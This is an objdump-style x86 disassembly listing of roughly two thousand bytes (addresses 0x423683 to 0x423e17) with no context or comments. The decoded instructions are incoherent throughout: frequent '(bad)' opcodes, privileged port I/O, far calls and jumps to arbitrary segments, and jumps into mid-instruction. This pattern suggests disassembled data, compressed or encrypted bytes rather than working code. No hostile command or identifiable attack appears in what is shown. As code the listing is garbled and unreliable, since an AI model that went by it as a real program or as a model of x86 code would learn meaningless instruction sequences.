  423683:	je     0x4236f0
  423685:	jnp    0x423609
  423687:	je     0x423695
  423689:	mov    cl,0x18
  42368b:	xchg   edx,eax
  42368c:	push   DWORD PTR [esi]
  42368e:	int3   
  42368f:	imul   esi,DWORD PTR [edx],0xd64dcc1d
  423695:	jbe    0x4236a3
  423697:	inc    ecx
  423698:	jle    0x423654
  42369a:	ficom  WORD PTR [eax]
  42369c:	push   ds
  42369d:	push   0xbc02f7d5
  4236a2:	mov    eax,ds:0x12fa1de6
  4236a7:	mov    cl,0xb0
  4236a9:	mov    ds:0xe51d7e46,al
  4236ae:	or     DWORD PTR [edx+0x18],ecx
  4236b1:	cmp    eax,0x42543a39
  4236b6:	sbb    al,0x29
  4236b8:	mov    edx,0x2bd2e2a5
  4236bd:	pop    ss
  4236be:	mov    al,0xe0
  4236c0:	(bad)  
  4236c1:	neg    BYTE PTR [edi-0x5]
  4236c4:	outs   dx,BYTE PTR ds:[esi]
  4236c5:	std    
  4236c6:	ret    0x86ae
  4236c9:	adc    al,0xed
  4236cb:	pushf  
  4236cc:	jae    0x4236e0
  4236ce:	test   DWORD PTR [ebx],esp
  4236d0:	xor    esp,ebx
  4236d2:	mov    esi,ecx
  4236d4:	je     0x4236d4
  4236d6:	stos   BYTE PTR es:[edi],al
  4236d7:	push   edx
  4236d8:	es jne 0x423758
  4236db:	mov    ch,0xf5
  4236dd:	clc    
  4236de:	mov    ecx,0xab870b04
  4236e3:	push   ebp
  4236e4:	ins    DWORD PTR es:[edi],dx
  4236e5:	pop    ebp
  4236e6:	mov    ebx,0xe2d49c0a
  4236eb:	pop    ds
  4236ec:	shl    DWORD PTR [ecx+ebp*4-0x70],0x39
  4236f1:	dec    eax
  4236f2:	sbb    DWORD PTR [ebp+0x23],ebx
  4236f5:	add    BYTE PTR [edx+0x3b1e1f7d],0x31
  4236fc:	inc    eax
  4236fd:	mov    ds:0xbdf308b2,eax
  423702:	jns    0x423738
  423704:	stos   DWORD PTR es:[edi],eax
  423705:	pop    esi
  423706:	sbb    al,0x26
  423709:	or     ah,dl
  42370b:	bound  ecx,QWORD PTR ds:0x63f2ace6
  423711:	mov    ecx,0x68b3a690
  423716:	scas   eax,DWORD PTR es:[edi]
  423717:	sbb    esi,DWORD PTR [ebx-0xd]
  42371a:	in     eax,dx
  42371b:	inc    esi
  42371c:	daa    
  42371d:	push   esp
  42371e:	dec    eax
  42371f:	jne    0x42376e
  423721:	and    eax,0x592de2e4
  423726:	and    eax,0x4250d272
  42372b:	jo     0x42376b
  42372d:	adc    al,0x91
  42372f:	mov    eax,0xff6c0dea
  423734:	sub    esp,DWORD PTR [edi]
  423736:	bound  esp,QWORD PTR [edi]
  423738:	sub    eax,DWORD PTR [eax+0x5b]
  42373b:	ds call 0x2208da0b
  423741:	inc    esi
  423742:	loope  0x42377d
  423744:	or     BYTE PTR [edx],bh
  423746:	sbb    eax,0xb58bdce7
  42374b:	xor    BYTE PTR [bx+0x44c6],0xf9
  423751:	in     al,dx
  423752:	mov    al,0x77
  423754:	(bad)  [eax+0x6b50221f]
  42375a:	in     al,dx
  42375b:	mov    edi,0xa43be91
  423760:	gs xchg ecx,eax
  423762:	jle    0x42378d
  423764:	xchg   edx,eax
  423765:	inc    esi
  423766:	adc    esp,ecx
  423768:	sbb    eax,0x1509399d
  42376d:	pop    ds
  42376e:	mov    dh,0x71
  423770:	jg     0x423722
  423772:	jl     0x423717
  423774:	xor    eax,DWORD PTR [eax+0x5997232a]
  42377a:	mov    edi,0xa38039d4
  42377f:	dec    ebx
  423780:	dec    edi
  423781:	mov    bl,0x57
  423783:	sbb    bh,bh
  423785:	cmp    BYTE PTR [ebx-0x3b],cl
  423788:	dec    ebx
  423789:	mov    ah,BYTE PTR [ecx+esi*4-0x4b]
  42378d:	adc    al,0x72
  42378f:	fs push esp
  423791:	xor    DWORD PTR [edi-0x51],edx
  423794:	mov    bh,0x73
  423796:	dec    eax
  423797:	xor    al,0xef
  423799:	jno    0x423756
  42379b:	retf   0x5441
  42379e:	ja     0x423804
  4237a0:	or     eax,0xf78cef3
  4237a5:	mov    dl,0x16
  4237a7:	xchg   esp,eax
  4237a8:	cdq    
  4237a9:	mov    edi,0x2d021d1
  4237ae:	ds jae 0x4237f3
  4237b1:	shl    edx,cl
  4237b3:	arpl   WORD PTR [edx-0x44],bp
  4237b6:	sbb    DWORD PTR [ecx-0x2fd49bbc],ecx
  4237bc:	gs (bad) 
  4237be:	rol    BYTE PTR [edx],cl
  4237c0:	hlt    
  4237c1:	jge    0x423746
  4237c3:	mov    al,0xd0
  4237c5:	ins    BYTE PTR es:[edi],dx
  4237c6:	mov    eax,0x6c70f2bf
  4237cb:	fwait
  4237cc:	pop    eax
  4237cd:	and    eax,0x16b047e7
  4237d2:	fistp  DWORD PTR [ecx-0x248fc46a]
  4237d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237d9:	retf   0xd340
  4237dc:	outs   dx,DWORD PTR ds:[esi]
  4237dd:	push   ebx
  4237de:	pop    edx
  4237df:	push   ebp
  4237e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237e1:	retf   0xd6f4
  4237e4:	and    al,0x9d
  4237e6:	xchg   edx,eax
  4237e7:	(bad)  
  4237e8:	mov    ch,0x9c
  4237ea:	jle    0x4237f7
  4237ec:	xor    eax,0xb7106542
  4237f1:	jl     0x423808
  4237f3:	test   DWORD PTR [esi-0x6eec74c7],eax
  4237f9:	pop    esi
  4237fa:	stos   DWORD PTR es:[edi],eax
  4237fb:	push   es
  4237fc:	fnstsw WORD PTR [edx+0x54]
  4237ff:	push   edi
  423800:	mov    edi,0x9672cde5
  423805:	jmp    FWORD PTR [esi]
  423807:	xchg   DWORD PTR [eax+0x70],eax
  42380a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42380b:	mov    dl,0x86
  42380d:	mov    ebx,0x6acf20c7
  423812:	das    
  423813:	gs pop eax
  423815:	add    DWORD PTR [ebx],ebp
  423817:	scas   eax,DWORD PTR es:[edi]
  423818:	ja     0x42383b
  42381a:	mov    ecx,0x1156f4b9
  42381f:	push   esi
  423820:	cmp    eax,0x5612a059
  423825:	jnp    0x423855
  423827:	pop    ebx
  423828:	or     dl,bh
  42382a:	cmp    esp,DWORD PTR [ebx]
  42382c:	(bad)  
  42382d:	js     0x423845
  42382f:	lods   eax,DWORD PTR ds:[esi]
  423830:	cli    
  423831:	add    al,0x4d
  423833:	popa   
  423834:	mov    ah,BYTE PTR [edx-0x1]
  423837:	clc    
  423838:	aaa    
  423839:	lahf   
  42383a:	fdivr  st(4),st
  42383c:	(bad)  [ebx-0x6f]
  42383f:	rol    DWORD PTR [eax],1
  423841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423842:	xchg   ebp,eax
  423843:	cmp    eax,0xc737caad
  423848:	jb     0x423880
  42384a:	cmp    BYTE PTR [ecx-0x3ebe7e45],dh
  423850:	inc    eax
  423851:	inc    eax
  423852:	(bad)  
  423853:	icebp  
  423854:	inc    ebx
  423855:	mov    eax,0x660e684b
  42385a:	arpl   cx,sp
  42385c:	add    eax,0x23d4eb13
  423861:	cld    
  423862:	xor    bh,al
  423864:	mov    al,ds:0x7092c747
  423869:	into   
  42386a:	(bad)  
  42386c:	scas   al,BYTE PTR es:[edi]
  42386d:	mov    ds:0x539bf0a0,eax
  423872:	add    DWORD PTR [ebx+0xe8679e6],esp
  423878:	push   ebp
  423879:	cmp    DWORD PTR [eax+ebp*2+0x6f],ebx
  42387d:	fldenv [ecx-0xc]
  423880:	aas    
  423881:	dec    esp
  423882:	int3   
  423883:	mov    ecx,0x181a6f2
  423888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423889:	sub    BYTE PTR [esi],0x4b
  42388c:	mov    bl,0x30
  42388e:	loope  0x423872
  423890:	not    BYTE PTR [edx-0x3a]
  423893:	lods   al,BYTE PTR ds:[esi]
  423894:	adc    ch,BYTE PTR [edi]
  423896:	mov    esp,0x736c2ea
  42389b:	sub    al,BYTE PTR [edi+0x23]
  42389e:	ds std 
  4238a0:	pop    ds
  4238a1:	inc    esi
  4238a2:	dec    eax
  4238a3:	cmp    WORD PTR [edi-0x13],0xfff5
  4238a8:	mov    esp,0x9030831e
  4238ad:	xchg   edi,eax
  4238ae:	pop    ss
  4238af:	jo     0x42386e
  4238b1:	int    0x1b
  4238b3:	ja     0x423871
  4238b5:	loop   0x423847
  4238b7:	out    dx,eax
  4238b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238b9:	cmp    DWORD PTR [edi+ebx*1+0x28f26189],edi
  4238c0:	or     bh,dh
  4238c2:	sub    al,0x82
  4238c4:	lods   al,BYTE PTR ds:[esi]
  4238c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238c6:	push   ecx
  4238c7:	lea    edx,[esi+0x46ece6ad]
  4238cd:	mov    bl,0xea
  4238cf:	lods   al,BYTE PTR ds:[esi]
  4238d0:	into   
  4238d1:	inc    ebp
  4238d2:	into   
  4238d3:	mov    dl,0xa1
  4238d5:	mul    BYTE PTR [esi+0x6cde524f]
  4238db:	loopne 0x4238e9
  4238dd:	call   FWORD PTR [edx+0x3574a4e5]
  4238e3:	xchg   ecx,eax
  4238e4:	add    ah,BYTE PTR [ecx]
  4238e6:	stos   DWORD PTR es:[edi],eax
  4238e7:	cmp    edx,DWORD PTR [eax+0x4ed2d3a9]
  4238ed:	push   edx
  4238ee:	fcomp  QWORD PTR [edx]
  4238f0:	sahf   
  4238f1:	fs sbb eax,0x75ee4611
  4238f7:	ss fcomp st(7)
  4238fa:	and    ecx,edi
  4238fc:	cmp    DWORD PTR ds:0x509e210c,eax
  423902:	xchg   edx,eax
  423903:	push   es
  423904:	(bad)
  423908:	adc    eax,0x7d3a4c0f
  42390d:	stos   BYTE PTR es:[edi],al
  42390e:	leave  
  42390f:	loopne 0x42392a
  423911:	pop    ecx
  423912:	adc    eax,0x45c75bfc
  423917:	in     al,dx
  423918:	mov    edx,0x52a2a993
  42391d:	out    0xd6,eax
  42391f:	aas    
  423920:	jmp    FWORD PTR [ebp-0x1d]
  423923:	mov    BYTE PTR [edi],bl
  423925:	jbe    0x4238cb
  423927:	push   eax
  423928:	or     esp,ecx
  42392a:	sbb    ch,BYTE PTR [edx-0x2a8d5766]
  423930:	xor    dh,bl
  423932:	pop    es
  423933:	pop    edi
  423934:	pop    es
  423935:	pop    esi
  423936:	or     al,0x4c
  423938:	out    0x31,eax
  42393a:	sbb    DWORD PTR [edx-0x29],0xd66721f0
  423941:	dec    ebx
  423942:	into   
  423943:	sub    DWORD PTR [esi+0x65ef3a7f],0x3f
  42394a:	adc    DWORD PTR [ebp+0x7d],eax
  42394d:	stos   BYTE PTR es:[edi],al
  42394e:	shl    DWORD PTR [ecx+0x9c0bb3],1
  423954:	adc    DWORD PTR [esi-0x7f32e6c1],0xffffffa7
  42395b:	(bad)  
  42395c:	sbb    al,0x9a
  42395e:	fwait
  42395f:	mov    ds:0xe7625c0b,al
  423964:	pushaw 
  423966:	cwde   
  423967:	pop    ss
  423968:	sahf   
  423969:	sub    DWORD PTR [esi+0x2adcff93],edx
  42396f:	iret   
  423970:	hlt    
  423971:	xchg   edx,eax
  423972:	jmp    0x4239ec
  423974:	pop    edx
  423975:	retf   0x9b00
  423978:	inc    edi
  423979:	xchg   ebp,eax
  42397a:	mov    ds:0x79f30acf,al
  42397f:	mov    bl,0x8e
  423981:	cdq    
  423982:	repz call 0x9e6:0x5ee4c6fb
  42398a:	dec    edi
  42398b:	mov    ebx,0xa7052f13
  423990:	test   bh,dh
  423992:	mov    ebp,DWORD PTR [eax-0x5a]
  423995:	xor    DWORD PTR [eax-0x29],eax
  423998:	str    ebx
  42399b:	pop    eax
  42399c:	ror    BYTE PTR [edx],1
  42399e:	enter  0xc31c,0x36
  4239a2:	pop    ebp
  4239a3:	call   0x26c7:0xdc2c8d05
  4239aa:	std    
  4239ab:	xor    eax,0x1c847f80
  4239b0:	pop    ebx
  4239b1:	and    eax,0x71dd82b3
  4239b6:	sub    al,0x87
  4239b8:	fimul  WORD PTR [ecx*8-0x44d67b8b]
  4239bf:	and    eax,0xc92f77aa
  4239c4:	jne    0x42398f
  4239c6:	mov    al,0x1f
  4239c8:	fwait
  4239c9:	add    al,0x9c
  4239cb:	jne    0x423a20
  4239cd:	test   BYTE PTR [esi],0xf5
  4239d0:	dec    esi
  4239d1:	pop    ebx
  4239d2:	stos   BYTE PTR es:[edi],al
  4239d3:	dec    ebx
  4239d4:	arpl   WORD PTR [esi+edx*1],ax
  4239d7:	ins    DWORD PTR es:[edi],dx
  4239d8:	je     0x423988
  4239da:	ficomp DWORD PTR [edi+0x1f9a2e44]
  4239e0:	repz cmp BYTE PTR [ecx-0xeffe21a],0xa3
  4239e8:	push   0xffffffa1
  4239ea:	push   ecx
  4239eb:	mov    al,0x3a
  4239ed:	pop    ds
  4239ee:	out    dx,eax
  4239ef:	push   ss
  4239f0:	and    BYTE PTR [ecx+esi*8-0x53a4d408],ch
  4239f7:	sub    BYTE PTR [ebx+0x70],al
  4239fa:	jae    0x423a23
  4239fc:	ja     0x423a0d
  4239fe:	scas   al,BYTE PTR es:[edi]
  4239ff:	add    BYTE PTR [edi-0x3aa9f3be],al
  423a05:	out    dx,al
  423a06:	outs   dx,BYTE PTR ds:[esi]
  423a07:	(bad)  
  423a08:	sub    ecx,ecx
  423a0a:	cmp    cl,bl
  423a0c:	cmp    BYTE PTR [esi+0x64],bh
  423a0f:	add    DWORD PTR [edx+0x6801a198],ebx
  423a15:	xor    eax,DWORD PTR [ebx]
  423a17:	(bad)  
  423a18:	sbb    eax,0x3c3a82a6
  423a1d:	out    0x22,eax
  423a1f:	or     al,0xd7
  423a21:	fisttp DWORD PTR [ecx]
  423a23:	add    eax,0x97d53e58
  423a28:	xchg   ebx,eax
  423a29:	xor    ah,cl
  423a2b:	test   BYTE PTR [edi-0x6b21c7ea],ah
  423a31:	jmp    FWORD PTR [ebp+0x1988cecb]
  423a37:	adc    DWORD PTR [eax+eax*4-0x44c87bda],edx
  423a3e:	xrelease mov BYTE PTR [edx+0x2a],dl
  423a42:	aaa    
  423a43:	out    dx,eax
  423a44:	pop    ds
  423a45:	mov    eax,?
  423a47:	and    eax,0x60a2a0c1
  423a4c:	sub    esp,DWORD PTR [ecx+0x19f2fb54]
  423a52:	inc    edi
  423a53:	cs xchg esp,eax
  423a55:	inc    ecx
  423a56:	popf   
  423a57:	out    0xf8,al
  423a59:	test   al,0x95
  423a5b:	in     al,0x45
  423a5d:	bound  edi,QWORD PTR [ebp+0x373885b2]
  423a63:	mov    ch,BYTE PTR [eax]
  423a65:	adc    dh,dh
  423a67:	adc    al,0xd3
  423a69:	es loope 0x423a96
  423a6c:	retf   
  423a6d:	xor    esp,edi
  423a6f:	(bad)  
  423a70:	jecxz  0x423ace
  423a72:	ficom  WORD PTR [eax-0x25]
  423a75:	dec    esp
  423a76:	or     ah,ah
  423a78:	fcmovnb st,st(5)
  423a7a:	mov    ah,0xc2
  423a7c:	jg     0x423a9f
  423a7e:	in     al,dx
  423a7f:	push   0xffffffed
  423a81:	pop    ecx
  423a82:	(bad)  
  423a83:	outs   dx,DWORD PTR ds:[esi]
  423a84:	gs shl ebp,0x25
  423a88:	scas   eax,DWORD PTR es:[edi]
  423a89:	pop    edx
  423a8a:	sbb    edx,eax
  423a8c:	imul   edi,DWORD PTR [ecx],0xffffffe1
  423a8f:	out    dx,al
  423a90:	mov    dl,dl
  423a92:	cmp    al,0x25
  423a94:	nop
  423a95:	sbb    BYTE PTR [ebp+0xd],al
  423a98:	jmp    0x423a73
  423a9a:	sbb    eax,0x855b267
  423a9f:	bnd jo 0x423b08
  423aa2:	out    0x63,eax
  423aa4:	std    
  423aa5:	scas   eax,DWORD PTR es:[edi]
  423aa6:	and    DWORD PTR [eax],ecx
  423aa8:	mov    ah,0xf2
  423aaa:	or     BYTE PTR [ebp-0x31d937b1],al
  423ab0:	imul   eax,DWORD PTR [ebx+0x7e],0xffffffa6
  423ab4:	gs pop esp
  423ab6:	push   es
  423ab7:	jo     0x423a8a
  423ab9:	inc    ebp
  423aba:	imul   edx,ecx,0x1e833de0
  423ac0:	xor    BYTE PTR [edi],dl
  423ac2:	jg     0x423adb
  423ac4:	imul   ebp,DWORD PTR gs:[ebx+ebp*2+0x6e23f98],0xffffff89
  423acd:	pushf  
  423ace:	adc    DWORD PTR [edx+edx*8+0x7a],edi
  423ad2:	fmul   QWORD PTR [eax+esi*2]
  423ad5:	mov    ebx,0x46a15686
  423ada:	loop   0x423a66
  423adc:	xor    al,0x2c
  423ade:	xor    eax,0x10505295
  423ae3:	call   0xecc6:0xe218810d
  423aea:	pushf  
  423aeb:	outs   dx,DWORD PTR ds:[esi]
  423aec:	inc    edx
  423aed:	or     al,0xfa
  423aef:	xchg   esi,eax
  423af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423af1:	addr16 dec esi
  423af3:	shl    cl,1
  423af5:	mov    ah,0x81
  423af7:	out    0x5d,eax
  423af9:	adc    BYTE PTR [edi-0xa],ah
  423afc:	pop    ebx
  423afd:	sbb    eax,0x40077776
  423b02:	mov    ch,0x79
  423b04:	or     DWORD PTR [edx-0x25],ebp
  423b07:	cs jp  0x423ae5
  423b0a:	lock or al,0xd9
  423b0d:	mov    DWORD PTR [ecx],esp
  423b0f:	(bad)  
  423b10:	aas    
  423b11:	jecxz  0x423acf
  423b13:	nop
  423b14:	test   eax,0xb21adbac
  423b19:	pop    ebx
  423b1a:	mov    al,0x73
  423b1c:	pusha  
  423b1d:	push   0x5f68cf25
  423b22:	pop    eax
  423b23:	pop    ebp
  423b24:	and    dh,ch
  423b26:	call   0xe657:0xd4ed5979
  423b2d:	popf   
  423b2e:	cmp    DWORD PTR [ebp-0x3],edi
  423b31:	xchg   ebp,eax
  423b32:	jmp    0xba044062
  423b37:	push   ebx
  423b38:	push   ebx
  423b39:	xchg   ebx,eax
  423b3a:	and    al,0x96
  423b3c:	gs ins BYTE PTR es:[edi],dx
  423b3e:	addr16 cmp al,0x67
  423b41:	out    0x56,eax
  423b43:	jb     0x423b2b
  423b45:	push   edx
  423b46:	or     edi,DWORD PTR [edi+0x50]
  423b49:	mov    BYTE PTR [ecx+eiz*4-0x51f179c4],dh
  423b50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b51:	sub    esp,DWORD PTR [ecx-0x43]
  423b54:	dec    edi
  423b55:	das    
  423b56:	cwde   
  423b57:	inc    esp
  423b58:	pushf  
  423b59:	(bad)  
  423b5a:	int3   
  423b5b:	dec    ecx
  423b5c:	ret    
  423b5d:	lds    ebp,FWORD PTR [ebp+0x67]
  423b60:	inc    ebp
  423b61:	arpl   WORD PTR [edi-0x19a61e44],ax
  423b67:	outs   dx,DWORD PTR ds:[esi]
  423b68:	repnz lock dec edi
  423b6b:	imul   esi,DWORD PTR ds:0x4cb7a089,0xa2479a2a
  423b75:	lahf   
  423b76:	fwait
  423b77:	sub    ebx,0xffffffc7
  423b7a:	das    
  423b7b:	or     eax,0xcb53e90
  423b80:	sub    esp,DWORD PTR [edi]
  423b82:	cmp    dl,BYTE PTR [eax]
  423b84:	test   al,0x54
  423b86:	fsubr  DWORD PTR [edx+edi*8-0x61]
  423b8a:	and    bh,BYTE PTR [eax+0x26db88a9]
  423b90:	in     al,0xfe
  423b92:	xchg   DWORD PTR [edi-0x5],ebx
  423b95:	stos   DWORD PTR es:[edi],eax
  423b96:	rcr    DWORD PTR [ecx-0x77],0x67
  423b9a:	push   edi
  423b9b:	stc    
  423b9c:	adc    al,0xba
  423b9e:	and    dh,0xdb
  423ba1:	(bad)  
  423ba2:	(bad)
  423ba5:	push   es
  423ba6:	ror    BYTE PTR gs:[esi+0x11],1
  423baa:	ror    DWORD PTR [ecx+0x2356041b],0x4f
  423bb1:	sub    esp,DWORD PTR [eax]
  423bb3:	cmc    
  423bb4:	ins    DWORD PTR es:[edi],dx
  423bb5:	ins    DWORD PTR es:[edi],dx
  423bb6:	fimul  DWORD PTR [edx]
  423bb8:	cs or  eax,0x137e87e6
  423bbe:	push   es
  423bbf:	or     eax,0x39d3cbb1
  423bc4:	adc    DWORD PTR [esi],0xffffff8d
  423bc7:	mov    bh,al
  423bc9:	(bad)  
  423bca:	in     al,dx
  423bcb:	sbb    eax,0x8e250dad
  423bd0:	lock lahf 
  423bd2:	lods   al,BYTE PTR ds:[esi]
  423bd3:	out    dx,eax
  423bd4:	push   edx
  423bd5:	inc    ecx
  423bd6:	dec    esi
  423bd7:	neg    cl
  423bd9:	xchg   ah,bh
  423bdb:	lods   al,BYTE PTR ds:[esi]
  423bdc:	mov    ebx,0xa329188c
  423be1:	push   ss
  423be2:	mov    dl,BYTE PTR [ebp+0x7b958fd]
  423be8:	and    ah,BYTE PTR [esi]
  423bea:	in     al,dx
  423beb:	data16 (bad) 
  423bed:	iret   
  423bee:	add    al,0xdb
  423bf0:	arpl   WORD PTR [edx+0x6c],ax
  423bf3:	leave  
  423bf4:	mov    al,ds:0xf75ba01a
  423bf9:	addr16 dec ecx
  423bfb:	inc    edi
  423bfc:	sti    
  423bfd:	sub    BYTE PTR [ebx+0x3e484bb8],ch
  423c03:	jmp    0x423c69
  423c05:	iret   
  423c06:	loope  0x423bd7
  423c08:	jmp    0x423c3f
  423c0a:	mov    eax,0xcc08acd2
  423c0f:	int    0x3f
  423c11:	mov    al,ds:0x43ae56f4
  423c16:	cmp    ebp,ebx
  423c18:	dec    ecx
  423c19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c1a:	push   eax
  423c1b:	sbb    ah,dl
  423c1d:	enter  0x4664,0xc3
  423c21:	xlat   BYTE PTR ds:[ebx]
  423c22:	cmp    eax,0x81bc2526
  423c27:	pusha  
  423c28:	or     BYTE PTR [edx],ch
  423c2a:	sar    BYTE PTR [edi-0x10],0xf4
  423c2e:	mov    edi,0xae50661d
  423c33:	jne    0x423c5b
  423c35:	xchg   ecx,eax
  423c36:	xor    BYTE PTR [esi+0x4a],bh
  423c39:	jno    0x423c5e
  423c3b:	imul   eax,eax,0x16b636d5
  423c41:	js     0x423c7a
  423c43:	in     eax,dx
  423c44:	add    ecx,DWORD PTR [ebp+0x1d]
  423c47:	mov    al,0x8d
  423c49:	cmp    BYTE PTR ds:0x6e74d9dc,al
  423c4f:	xor    BYTE PTR [edi-0x14],0x5a
  423c53:	jl     0x423bfc
  423c55:	mov    bl,0xfa
  423c57:	fwait
  423c58:	ror    ecx,1
  423c5a:	in     al,dx
  423c5b:	(bad)  ss:[ebp+edx*1-0x484bbdc5]
  423c63:	cdq    
  423c64:	mov    ebp,0x6aaf4a2e
  423c69:	fs jmp 0x423cc0
  423c6c:	or     bh,BYTE PTR [ebp+0x10566212]
  423c72:	mov    edx,0x7bd86fa3
  423c77:	(bad)  
  423c78:	cld    
  423c79:	mov    edi,0xeb1af50
  423c7e:	int    0xd3
  423c80:	cmp    DWORD PTR [esi],ebx
  423c82:	in     eax,dx
  423c83:	push   esi
  423c84:	cwde   
  423c85:	sbb    ah,BYTE PTR [edx]
  423c87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c88:	xchg   BYTE PTR [ecx-0x1fac215c],bh
  423c8e:	push   ecx
  423c8f:	dec    esi
  423c90:	in     al,0x84
  423c92:	push   es
  423c93:	mov    ds:0xab7fb983,eax
  423c98:	loopne 0x423cd3
  423c9a:	inc    ebx
  423c9b:	inc    esi
  423c9c:	test   eax,0x1f6c0fc7
  423ca1:	test   DWORD PTR [eax],edi
  423ca3:	cmp    edx,ebp
  423ca5:	loope  0x423c3b
  423ca7:	mov    ah,0x43
  423ca9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423caa:	jmp    0x51c7:0x4d976dc2
  423cb1:	adc    edi,ebx
  423cb3:	popf   
  423cb4:	sub    al,0x66
  423cb6:	push   esi
  423cb7:	hlt    
  423cb8:	cwde   
  423cb9:	or     esi,edx
  423cbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cbc:	out    dx,al
  423cbd:	dec    esp
  423cbe:	test   al,0x49
  423cc0:	sub    ebx,DWORD PTR [ebx]
  423cc2:	pop    ebp
  423cc3:	add    esi,DWORD PTR [ebx]
  423cc5:	fidivr DWORD PTR [eax-0x180fc7fa]
  423ccb:	mov    al,0xa2
  423ccd:	(bad)  
  423cce:	rol    DWORD PTR [ebx+0x3f13b1e],1
  423cd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cd5:	clc    
  423cd6:	mov    ebx,0x5724089a
  423cdb:	(bad)  [ecx-0x80]
  423cde:	shr    dh,cl
  423ce0:	rcr    BYTE PTR ds:0xdbde6d61,0x6
  423ce7:	in     eax,dx
  423ce8:	sbb    dh,BYTE PTR [eax]
  423cea:	loop   0x423d36
  423cec:	mov    ecx,0x4be497ce
  423cf1:	pop    ebp
  423cf2:	arpl   WORD PTR [eax+0x1c12cec8],ax
  423cf8:	fs (bad) 
  423cfa:	adc    DWORD PTR [edx+0x155ce968],esi
  423d00:	mov    edx,0x420b320b
  423d05:	mov    ss,WORD PTR [esi]
  423d07:	sahf   
  423d08:	dec    esi
  423d09:	iret   
  423d0a:	adc    cl,BYTE PTR [ebx-0x1a7291fc]
  423d10:	mov    WORD PTR [ebx],cs
  423d12:	cmp    al,0x13
  423d14:	mov    eax,ds:0x562d413
  423d19:	imul   ecx,DWORD PTR [esi-0x80],0xb37323f3
  423d20:	adc    al,0x37
  423d22:	outs   dx,BYTE PTR ds:[esi]
  423d23:	es loopne 0x423d85
  423d26:	stos   DWORD PTR es:[edi],eax
  423d27:	loop   0x423d1d
  423d29:	lods   eax,DWORD PTR ds:[esi]
  423d2a:	adc    DWORD PTR [ebx],edx
  423d2c:	sub    eax,0xc910f513
  423d31:	adc    esi,DWORD PTR [esi+0x26]
  423d34:	fld    QWORD PTR [edx+edx*2]
  423d37:	popa   
  423d38:	sbb    al,0x6c
  423d3a:	test   al,0x3b
  423d3c:	daa    
  423d3d:	fcomp  DWORD PTR [ebx]
  423d3f:	and    eax,0x46ff0bbb
  423d44:	lock cli 
  423d46:	shr    BYTE PTR [ebp+0x46],0x94
  423d4a:	pushf  
  423d4b:	mov    edi,0x2685ecb4
  423d50:	push   esp
  423d51:	sahf   
  423d52:	cmp    eax,0xe5947b85
  423d57:	sub    DWORD PTR [ebx],esp
  423d59:	imul   esi,DWORD PTR [edx],0xffbd8c87
  423d5f:	lock test BYTE PTR [esi+0x587cd824],0x49
  423d67:	in     al,0x7e
  423d69:	mov    bh,0x22
  423d6b:	pop    esp
  423d6c:	sub    edi,DWORD PTR [eax-0x62]
  423d6f:	cmp    BYTE PTR [edx],cl
  423d71:	jno    0x423d65
  423d73:	retf   
  423d74:	mov    eax,0x3cfe0dda
  423d79:	mov    ds:0xbeec8bd8,eax
  423d7e:	xchg   esp,eax
  423d7f:	fisubr DWORD PTR [ecx+0x55]
  423d82:	retf   0x6fd2
  423d85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d86:	fstp   DWORD PTR [esi+0x43]
  423d89:	inc    eax
  423d8a:	jle    0x423d2a
  423d8c:	cmp    dl,dh
  423d8e:	out    0x86,eax
  423d90:	out    dx,al
  423d91:	push   ebp
  423d92:	out    0x1,eax
  423d94:	dec    ecx
  423d95:	inc    edx
  423d96:	dec    esi
  423d97:	push   ebp
  423d98:	fst    DWORD PTR [eax+ecx*2-0x2]
  423d9c:	fsubp  st(5),st
  423d9e:	leave  
  423d9f:	jg     0x423e0f
  423da1:	jno    0x423d85
  423da3:	clc    
  423da4:	in     eax,dx
  423da5:	mov    esp,0x15749b16
  423daa:	adc    ebp,ebp
  423dac:	stos   BYTE PTR es:[edi],al
  423dad:	sbb    eax,DWORD PTR [ebp-0x71]
  423db0:	xor    cl,BYTE PTR [esi+0x46]
  423db3:	adc    eax,0xe8dd0d5
  423db8:	pop    es
  423db9:	xor    ebx,DWORD PTR [esi-0x5c]
  423dbc:	pop    esp
  423dbd:	js     0x423d5d
  423dbf:	outs   dx,DWORD PTR ds:[esi]
  423dc0:	hlt    
  423dc1:	cmp    bh,BYTE PTR [eax-0x6f]
  423dc4:	test   eax,0xf948e370
  423dc9:	stos   DWORD PTR es:[edi],eax
  423dca:	xchg   ecx,eax
  423dcb:	sbb    al,0x3c
  423dcd:	nop
  423dce:	dec    DWORD PTR [edi+0xb]
  423dd1:	packuswb mm5,QWORD PTR [edx-0x27]
  423dd5:	ins    BYTE PTR es:[edi],dx
  423dd6:	sub    BYTE PTR [esi+0x6a979439],ah
  423ddc:	xchg   ebx,eax
  423ddd:	(bad)  
  423dde:	pusha  
  423ddf:	add    al,0xa4
  423de1:	or     ch,dh
  423de3:	sbb    al,0x25
  423de5:	push   ss
  423de6:	jmp    0xb4316db
  423deb:	dec    eax
  423dec:	push   esp
  423ded:	pushf  
  423dee:	xchg   esi,eax
  423def:	hlt    
  423df0:	jae    0x423de7
  423df2:	cli    
  423df3:	lods   eax,DWORD PTR ds:[esi]
  423df4:	(bad)  
  423df5:	stc    
  423df6:	cwde   
  423df7:	sti    
  423df8:	mov    ebp,0x64ab6be4
  423dfd:	mov    WORD PTR [edi+eax*4+0x1abfa983],ds
  423e04:	xor    edi,DWORD PTR [ebx-0x3220897]
  423e0a:	dec    ecx
  423e0b:	dec    esi
  423e0c:	inc    eax
  423e0d:	mov    ah,0xd0
  423e0f:	jnp    0x423e0a
  423e11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e12:	mov    esi,0x5f83644d
  423e17:	sbb    eax,0xde30c389
